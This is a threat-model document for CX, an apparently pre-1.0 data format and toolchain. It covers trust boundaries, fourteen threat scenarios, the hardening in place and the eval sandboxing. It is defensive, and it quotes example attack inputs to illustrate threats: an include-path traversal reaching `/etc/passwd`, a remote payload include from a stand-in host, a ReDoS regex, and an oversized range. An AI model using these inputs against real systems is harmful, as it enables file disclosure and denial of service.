# CX Threat Model

**Status:** Current for v0.8.0

This document records CX's threat model: what the project is hardened against, what it isn't, the assumed deployment model, and where the trust boundaries sit. It is normative for hardening claims and informative for adopters evaluating CX for a particular deployment.

Vulnerability reports are handled via [`SECURITY.md`](../../SECURITY.md).

## 1 — Scope

### In scope

- The V reference implementation (`vcx/`).
- The C ABI surface (every `cx_*` symbol declared in [`../core/abi.md`](../core/abi.md)).
- The CX CLI.
- All language bindings under `lang/` and the native V binding at `lang/v/native/`.
- The CXCol v1 binary wire format ([`../core/data-bin.md`](../core/data-bin.md)).
- The binary AST wire format ([`../core/ast-bin.md`](../core/ast-bin.md)).
- The streaming event protocol ([`../core/streaming.md`](../core/streaming.md)).

### Out of scope

- The V toolchain itself (treated as a trusted dependency).
- Third-party libraries in language bindings (cffi, koffi, JNA, etc.).
- Operating-system, container, and network-stack vulnerabilities.
- Trust in the source distribution (verifying that a downloaded `libcx.so` matches the official release is the consumer's responsibility; reproducible builds and signed releases are roadmap items).

### Pre-1.0 caveat

CX is pre-1.0 and has not received an external security audit. The hardening in §5 is real and tested through the conformance suite. Use CX for prototypes, internal tools, and exploratory work; do not point a CX parser at adversarial input on a public-facing endpoint until external review is in place.

## 2 — Assumed deployment model

CX assumes one of three deployment shapes.

### A — Trusted file inputs (default-safe)

CX reads files written by the same operator who runs the CX toolchain. Inputs are from a controlled source. This is the use case CX is designed for; the hardening in §5 is sufficient.

### B — Semi-trusted inputs (acceptable with caveats)

CX reads files from a less-controlled source (pull requests, CI artifacts, third-party config, vendored data). Inputs may be malformed, oversized, or lightly adversarial. The §5 hardening is sufficient; the consumer pins a known `libcx` version and applies the documented resource limits.

### C — Untrusted / adversarial inputs (not recommended pre-1.0)

CX reads files from an attacker-controlled source. CX is not yet hardened for this case: no published fuzz suite, no external security audit, pre-1.0 toolchain. Defer to 1.0.

## 3 — Trust boundaries

CX participates in three trust boundaries. Hardening at one does not automatically protect another.

1. **Input parser boundary.** Bytes from an external source enter the CX parser via `cx_to_data_bin` / `cx_to_data_bin_with_len`, the `cx_*_to_ast_bin` family (`cx_xml_to_ast_bin`, `cx_json_to_ast_bin`, `cx_yaml_to_ast_bin`, `cx_toml_to_ast_bin`, `cx_md_to_ast_bin`, plus the symmetric `cx_ast_bin_to_*` emitters), `cx_events_open` / `cx_events_open_fd` for the streaming surface, the CLI entry points (`cx parse`, `cx eval`, `cx fmt`, `cx canonical`, `cx hash`, `cx validate`), or any binding's `loads` / `parse` / `parse_xml` / `parse_json` / etc. The parser converts those bytes to in-process AST or data structures.
2. **C ABI boundary.** Every binding crosses the FFI boundary into `libcx`. Inputs are passed as `(pointer, length)` byte buffers; outputs return as framed `[u32 LE size][payload]` buffers per [`../core/abi.md`](../core/abi.md).
3. **Inclusion boundary.** When a CX document contains `[?cx include=PATH]`, the parser opens and parses an additional file. Path resolution is part of this boundary; semantics are normative in [`../core/code.md`](../core/code.md) §13.

## 4 — Threat actors and scenarios

### T1 — DoS via crafted input

Crafted input designed to consume disproportionate CPU or memory: deeply nested elements, billions of small attributes, a binary payload declaring sizes that force the decoder to allocate a huge buffer, or a single line longer than RAM.

**Mitigation:** §5 recursion limit, count caps, payload-size validation, varint validation, allocation budgets. All limits are documented and tunable.

### T2 — Memory corruption via FFI

Crafted input or a binding API invocation that triggers an out-of-bounds read or write across the C ABI boundary (e.g., a malformed CXCol payload with a length prefix that exceeds the available buffer).

**Mitigation:** length-prefixed framing on every binary buffer; each binding deserializes once with explicit bounds checks per [`../core/abi.md`](../core/abi.md); the V core uses bounds-checked array access; binding codecs use the host language's safe deserialization primitives.

### T3 — Confused-deputy via include-path traversal

An attacker crafts `[?cx include=../../../etc/passwd]` or `[?cx include=https://evil.example/payload.cx]` to cause the parser to read a file or URL the operator did not intend.

**Mitigation:** include resolution is **path-only** (no URL fetching), refuses absolute paths, refuses paths that escape the include root, and enforces a depth cap. Error codes are enumerated in [`../core/code.md`](../core/code.md) §13. Consumers of `libcx` set the include-search-root via the C ABI before parsing.

### T4 — Type-confusion across conversion

An attacker exploits a CX-to-target-format conversion to coerce a value (e.g., an integer expected, but a string slips through silently due to a format round-trip).

**Mitigation:** type fidelity through CXCol v1 is the design north star ([`../core/data-bin.md`](../core/data-bin.md)). String-format round-trips are forbidden on hot paths; type-bearing values cross format boundaries through binary AST, not text. Consumer code that re-derives types from JSON-emitted strings is on the consumer.

### T5 — Hash-collision / canonical-form bypass

An attacker crafts two CX documents that hash to the same value despite differing in semantically meaningful content.

**Mitigation:** `cx hash` is SHA-256 of strict canonical bytes ([`../core/canonical.md §1.2`](../core/canonical.md)). Strict canonical removes comments, expands anchors/aliases, resolves merges, normalises datetime offsets to UTC, and preserves attribute and map-key order from source (canonical does NOT sort — see [`../core/canonical.md §2.1`](../core/canonical.md)); the binary lane (`cx_to_data_bin`, [`../core/canonical.md §4`](../core/canonical.md)) is the compact alternative when both sides agree to use it. Two semantically distinct documents producing the same SHA-256 input is an attack on SHA-256, not on CX. Cross-binding determinism is enforced by [`governance.md`](governance.md) §2.3.

### T6 — Supply-chain / artifact tampering

An attacker compromises a published `libcx` binary, a registry-published binding, or a build-time dependency, replacing it with a compromised version.

**Mitigation today:** the `SHA256SUMS.txt` published with each release tag lets a consumer verify a downloaded `libcx` artifact. Each binding's package-manager checksum applies to the binding source; the `libcx` binary downloaded at install time is the residual risk. Reproducible builds and Sigstore signatures are roadmap items.

### T7 — Information disclosure via error messages

An attacker probes a CX-using service with malformed input designed to elicit error messages that leak file paths, environment state, or service internals.

**Mitigation:** `libcx` error messages are bounded in length and include line/column numbers but no file paths or runtime state ([`../core/abi.md`](../core/abi.md)). Bindings format their own errors on top of the libcx string; binding-level error wrapping should not include caller-supplied paths in default messages. Consumer applications that re-export CX errors verbatim to an external surface should sanitize first.

### T8 — Streaming-API resource exhaustion

An attacker uses the events streaming API (`cx_events_open` / `next` / `close`) to hold a long-lived parser handle and starve the host process of file descriptors or memory.

**Mitigation:** handle lifecycle is documented in [`../core/streaming.md`](../core/streaming.md); consumers set per-handle limits (max events, max bytes consumed). Each handle owns a bounded internal buffer.

### T9 — ReDoS via regex functions

The `cx-stdlib/re` module ([`../std-lib/re.md`](../std-lib/re.md)) — `re:matches`, `re:find`, `re:find-all`, `re:replace`, `re:replace-first`, `re:replace-fn`, `re:split` — plus the schema `[pattern …]` constraint ([`../core/schema.md`](../core/schema.md) §7.1, rule `S008`) accept caller-supplied regex patterns. PCRE/Perl-style engines run for minutes on catastrophic-backtracking patterns such as `(a+)+$`.

**Mitigation:** all regex call sites route through the vendored RE2 engine inside `libcx`. Matching is **linear-time in the input length** with no exposure to backtracking explosion. The same engine backs `cx-stdlib/re` and the schema `[pattern …]` constraint, so cross-binding regex-flavour drift is also eliminated.

### T10 — Function-recursion DoS

A `[?def]` body that recurses unconditionally, or a partial-application chain that expands to unbounded call depth at evaluation time, exhausts the evaluator stack.

**Mitigation:** the evaluator enforces a configurable call-depth cap (default 256) at every call entry. Over-cap surfaces structurally as an evaluator error the host catches rather than a process abort.

### T11 — Sequence-length DoS

The `[$range lo hi step?]` builtin (and the open-ended `[$range lo *]` / `[$iterate]` / `[$unfold]` generators) can materialise enormous sequences (e.g., `[$range 1 9999999999]`).

**Mitigation:** a configurable per-evaluator sequence-length cap (default 1,000,000 items) is checked before any allocation. Over-cap surfaces as an evaluator error.

### T12 — Streaming-sink DoS

The streaming evaluator takes a host-supplied callback invoked once per emitted chunk. An attacker who controls the network can apply backpressure to the sink and pin the evaluator (and its allocator state) for an unbounded duration.

**Mitigation:** the streaming evaluator inherits T10 + T11 budgets. The sink callback is documented as synchronous-best-effort; the core does not enforce a per-chunk timer. Consumers wrapping the streaming API for untrusted-network sinks MUST apply their own timeout.

**Streaming-write surface (symmetric threats).** The streaming-write API (`cx_events_writer_open` / `_emit` / `_close` per [`../core/streaming.md`](../core/streaming.md) §3) has two adjacent threat shapes that share T12's caller-responsibility framing:

- *Malicious-sink amplification.* A writer pointed at an attacker-controlled sink may be coerced into emitting unbounded bytes by interleaving cheap directives in the source program. The T10 (call-depth) and T11 (sequence-length) budgets bound per-call work but not aggregate bytes-out; the host MUST apply a byte-budget around the writer handle and apply per-emit wall-clock timeouts as in the buffered streaming case above.
- *Partial-write resource pinning.* A writer that observes an attacker-pinned sink holds its internal buffer plus the underlying file-descriptor / socket until close. `cx_events_writer_close` releases every owned resource (buffer, fd, allocator arena) deterministically. `W009` ("emit not supported for this event kind / target") is **fail-closed** — the writer raises and aborts the streaming session before any partial-write side-effect, so a malformed source program cannot leak bytes nor pin the handle past the first invalid emit.

### T13 — Schema-validation bypass via dynamic xs: constructors

Without a strict parse, an attacker could submit a non-numeric string through `xs:integer($user_input)` / `xs:double(...)` and have it silently coerced to 0 (integer) or 0.0 (double) instead of raising an error. Downstream code treating the result as a "validated number" then acts on attacker-supplied garbage.

**Mitigation:** every `xs:int*`, `xs:double`, `xs:float`, `xs:decimal`, `xs:nonNegativeInteger`, `xs:positiveInteger`, and `cast-as` target routes through a strict parse path. Inputs that don't parse as a number raise an `FORG0001`-class error carrying the offending value. Numeric scalar inputs pass through unchanged. Callers wanting lenient behaviour use explicit `[?match]` / `[?else]` / `[?castable-as]` guards.

### T14 — CSRP network surface (`cx-store://`)

A network-deployed CXStore Remote Protocol server ([`../misc/cxstore-remote-protocol.md`](../misc/cxstore-remote-protocol.md), CSRP) is reachable from untrusted clients; the wire protocol carries auth tokens, query / mutation payloads, and result-set bytes that an attacker could intercept, replay, or amplify.

**Mitigation:**

- Bearer-token authentication per `cxstore-remote-protocol.md §2.1`; tokens are presented in `Authorization: Bearer <token>` headers. Token rotation policy is per deployment (not specified by CSRP) and the server returns `CXER1702 E_CSRP_AUTH_REQUIRED` for missing tokens and `CXER1703 E_CSRP_AUTH_INVALID` for bad ones.
- HTTPS-only is RECOMMENDED for any non-loopback deployment; plaintext HTTP is documented as dev-only. Transport security inherits from the deploying webserver / reverse proxy.
- Server-side payload-size limits per the `capabilities` response (`max-request-bytes`, `max-response-bytes`); an over-cap request returns 413 with `CXER1705 E_CSRP_PAYLOAD_TOO_LARGE`.
- Server-side rate limits per the `capabilities` response (`requests-per-minute`, `bytes-per-second`).
- Doc-ID integrity verification on the client: the SHA-256 hash domain for a returned document is strict-canonical bytes (per `canonical.md §1.2`), and the client cross-checks the wire-claimed hash against the locally-computed hash before trusting the body. A mismatch raises `CXER1720 E_CSRP_INTEGRITY_MISMATCH`.
- Replay protection beyond Bearer-token freshness is the operator's responsibility (out of CSRP scope).

Operator-network threats — DDoS, traffic analysis, infrastructure compromise — are inherited from the deployment substrate and are not covered by CX governance.

## 5 — Hardening currently in place

Defenses present at the V core and inherited by every binding, each testable through the conformance suite.

| defense | mechanism | reference |
|---|---|---|
| Recursion limit | configurable depth cap (default 64), enforced at parse and AST traversal | [`../core/code.md`](../core/code.md) |
| Element / attribute count caps | configurable per-document and per-element | [`../core/code.md`](../core/code.md) |
| Payload-size cap | per-allocation budget on binary decoders | [`../core/data-bin.md`](../core/data-bin.md) |
| Varint validation | overlong / truncated varints rejected | [`../core/data-bin.md`](../core/data-bin.md) |
| External-entity rejection | DOCTYPE parsed but inert; no entity expansion | [`../core/grammar.ebnf`](../core/grammar.ebnf) |
| XXE / billion-laughs immunity | follows from external-entity rejection | (by-construction) |
| Include-resolution scoping | path-only, caller-supplied root, depth cap, absolute-path refusal | [`../core/code.md`](../core/code.md) §13 |
| UTF-8 validation | invalid UTF-8 in any input is an error | [`../core/abi.md`](../core/abi.md) |
| Bounds-checked deserialization | every binding's CXCol / AST decoder validates length prefixes before allocation | [`../core/abi.md`](../core/abi.md); [`governance.md`](governance.md) §1.2 |
| Type-preservation across formats | CXCol v1 binary, no string-format round-trips on hot paths | [`../core/data-bin.md`](../core/data-bin.md) |
| Canonical-form determinism | `cx canonical` byte-stable across runs and bindings | [`../core/canonical.md`](../core/canonical.md); [`governance.md`](governance.md) §2.3 |
| Linear-time regex | all regex call sites route through the vendored RE2 shim | [`../std-lib/re.md`](../std-lib/re.md) |
| Function-recursion budget | evaluator enforces configurable call-depth cap (default 256) | [`../core/code.md`](../core/code.md) |
| Sequence-length budget | evaluator enforces configurable sequence-length cap (default 1,000,000) | [`../core/code.md`](../core/code.md) |
| Strict xs: constructors | `xs:integer` / `xs:double` / `xs:decimal` / etc. raise on unparseable string inputs | [`../core/code.md`](../core/code.md) |
| Capability-based sandboxing | deny-by-default capability set; no ambient authority; a program may only narrow its set, never widen it; denial raises `CXER0271` | [`../core/security.md`](../core/security.md) |
| Secret redaction | secret values redact at every serialization / log / error / debug boundary unless declassified (`secret-reveal`) | [`../core/cxdm.md`](../core/cxdm.md) §12 |

## 6 — Known unhardened areas

| area | status |
|---|---|
| External security audit | absent (1.0 milestone) |
| Reproducible `libcx` builds | partial (consumer SHA-256 verification ships; build determinism is roadmap) |
| Signed release artifacts | absent (1.0 milestone) |
| Streaming-write per-chunk timer | absent — caller responsibility (T12) |
| BOM / line-ending policy | **defined** — UTF-8 mandatory; UTF-8 BOM tolerated on parse and never emitted; LF / CRLF / CR all tolerated on parse; canonical emit produces LF only (per [`../core/conversions.md §0.4`](../core/conversions.md), [`../core/canonical.md §2.2`](../core/canonical.md), and [`../core/code.md §3.1`](../core/code.md)) |
| Unicode normalization policy | **defined** — input bytes preserved; NFC applied only for duplicate-key comparison, never to stored strings (per [`../core/abi.md §1.7`](../core/abi.md)) |
| Hard sandboxing for the evaluator | **defined by composition** — the purity classifier (`pure` modifier on `[?def]` per [`../core/code.md §12.2`](../core/code.md), enforced against the closed builtin-purity table at [`../core/code.md §6.5.x`](../core/code.md)) refuses any reach into impure surfaces; `cx:eval` runs adversary-controlled program fragments under the five-mitigation sandbox at [`../modules/cx.md §3`](../modules/cx.md) (impurity refusal, context-map isolation, library-set non-widening, recursion-depth cap, and shared T10/T11/T9 budgets — see §10 and §11 of this document). A process-level hard sandbox (cgroup / seccomp / ulimit) remains the caller's responsibility for adversary-controlled inputs. |

Each row is tracked in `ROADMAP.md` and moves to §5 as it closes.

## 7 — Trust assumptions adopters should verify

An adopter deploying CX makes these assumptions; the threat model is written assuming each holds.

1. **The `libcx` binary you load is the one published.** Verify SHA-256 against `SHA256SUMS.txt` for the release tag, or build from a checked-out source tree at a known commit.
2. **Resource limits are tuned for your environment.** Defaults are conservative for general-purpose use; high-throughput services raise them, low-trust services lower them.
3. **Include resolution is restricted to a known root.** If your service parses CX documents from semi-trusted sources, set the include-root before parsing or disable include resolution entirely.
4. **Error messages are not re-exported verbatim** to surfaces accessible by attackers.
5. **The host process applies appropriate isolation** — file-descriptor limits, memory limits, syscall sandboxing — that the format itself cannot enforce.

## 8 — Reporting a vulnerability

See [`SECURITY.md`](../../SECURITY.md). Coordinated disclosure with a 7-day window after a fix lands.

## 9 — Out-of-scope vulnerability classes

The following are explicitly *not* CX vulnerabilities, even when reachable through a CX-using application:

- Bugs that require the operator to write a CX file containing attacker-controlled content and then load it under elevated privilege. (Deployment vulnerability, not a parser vulnerability.)
- Bugs in third-party tooling that consume CX output (e.g., a downstream JSON consumer mishandling a CX-emitted JSON document). Report to the downstream tool.
- Side channels that require co-resident execution and are inherent to the host architecture (Spectre-class).
- Algorithmic-complexity attacks that the configured resource limits would have prevented if the defaults were used.

If a report is unclear which side it falls on, file it; the maintainers will route appropriately.

## 10 — Trust model for `cx_code_eval`

The evaluator C-ABI surface (`cx_code_eval`, `cx_code_eval_streaming`, and the per-binding wrappers) takes three caller-supplied inputs: a CX data document (the context), a CX code template (the program), and an output target (`text` / `cx` / `html`).

`cx_code_eval` is **not** a sandbox between mutually distrusting parties. A template can read any node in the data document and emit any value derived from it. Capability separation is the caller's responsibility **unless a capability set is supplied** ([`../core/security.md`](../core/security.md)): with deny-by-default capabilities the runtime enforces separation at the effect point (a denied effect raises `CXER0271`), and `cx:eval` fragments run under a non-wideable subset of the caller's set.

**Data-untrusted posture.** The data document comes from an untrusted source; the template is operator-authored. Untrusted-data DoS scenarios (T1, T9–T11) are bounded by the documented hardening. Output sanitisation for the chosen target (auto-escape on `html`) is enforced.

**Eval-injection posture.** The template itself comes from an untrusted source. The template can read every node and attribute the caller passed, emit any value derived from those nodes, and cause an evaluation error that surfaces to the caller. The template cannot read files (`[?cx include]` is path-restricted per T3), reach the network (no `http:`/`file:` modules ship), or escape its T10/T11/T9 budgets. Callers MUST still apply per-evaluation wall-clock timeouts and host-level memory caps — the evaluator's budgets bound worst-case-per-call but do not bound wall-clock for a malicious template that interleaves many cheap operations.

**Eval-injection of a template into another template's context** (e.g., a CMS that lets an editor write `[?=$user_template]` where `$user_template` is itself a CX source string) is a deployment vulnerability, not a parser vulnerability. Don't do it.

## 11 — Trust model for `cx:eval` (self-host)

[`../modules/cx.md`](../modules/cx.md) §3 specifies the `cx:eval(source, context, options?)` self-host function — the homoiconic runtime callable that evaluates a CX source string at runtime against a context map. It is **categorically different** from §10's C-ABI entry: `cx_code_eval` runs an operator-authored template against caller data; `cx:eval` runs a string-supplied program that may itself be adversary-controlled.

### 11.1 — Untrusted-input sources

A `cx:eval` call is **in scope** for this section whenever its `source` argument is:

- derived from a network request body, query parameter, or header;
- read from a filesystem path supplied by an end user or a user-writable configuration directory;
- read from stdin, an environment variable, a database column, or a message-queue payload;
- interpolated from any value not authored by the same trust domain as the caller binary.

A `cx:eval` call is **out of scope** when its `source` argument is a static string literal in the calling document (semantically equivalent to a `[?def]` block — already trusted authoring-time code) or a string derived deterministically from such a literal by pure operations.

### 11.2 — Mitigations

[`../modules/cx.md`](../modules/cx.md) §3 specifies five mitigations; they map to threat vectors as follows.

| # | Mitigation | Defends against |
|---|---|---|
| M1 | `cx:eval` is `impure`; the purity classifier refuses it from any `pure` `[?def]` body (raises `CXER0233`). | Accidental exposure — a `pure`-marked surface cannot reach `cx:eval`. |
| M2 | Sandboxed `CXLEnv` — only context-map keys are visible inside the fragment. | Information disclosure / capability escalation — the caller's `[?def]` / `[?let]` / `[?with]` bindings are not visible; data flow is audit-visible through the context map. |
| M3 | Module pass-through is restrictive — the fragment cannot widen the caller's `[?lib]` set (raises `CXER4113`). | Capability escalation through library activation — the fragment may narrow but never widen. |
| M4 | Recursion-depth cap — default 8, per-call via `options.max-depth`, per-document via `[?cx max-eval-depth=N]` (raises `CXER4114`). | Stack-exhaustion DoS — counter increments across the include chain so mutual recursion is bounded cumulatively. |
| M5 | The fragment shares the enclosing evaluator's T10 / T11 / T9 budgets. | The general DoS posture from §4 applies inside `cx:eval` as well. |

### 11.3 — Recommended deployment patterns

1. **Process boundary.** Run `cx:eval`-bearing documents in a separate OS process with a documented memory cap (cgroups / `ulimit -v` / equivalent) and wall-clock timeout. The mitigations bound worst-case-per-call but do not bound accumulated wall-clock.
2. **Context-map minimisation.** Pass only the values the fragment needs into the `context` map. The map literally enumerates the fragment's data-access surface.
3. **Library-set minimisation.** Activate only the `[?lib]` modules the fragment requires at the calling-document head. M3 bounds the fragment to the caller's set.
4. **Output sanitisation.** `cx:eval` outputs are not sanitised. Callers using the output in HTML contexts route through `[?cx output-target=html]` (auto-escape) or apply a domain-appropriate sanitiser.

### 11.4 — Known limits

- **No CPU/memory budget per fragment.** Mitigations bound recursion depth and the static-enumeration surface; they do not bound total cycles or allocations spent inside a single call. Process-level limits are the load-bearing defense.
- **Origin threading is informational, not authoritative.** The `options.origin-uri` / `origin-line` / `origin-col` keys thread through for error-reporting purposes only; a fragment cannot rely on them for security decisions.
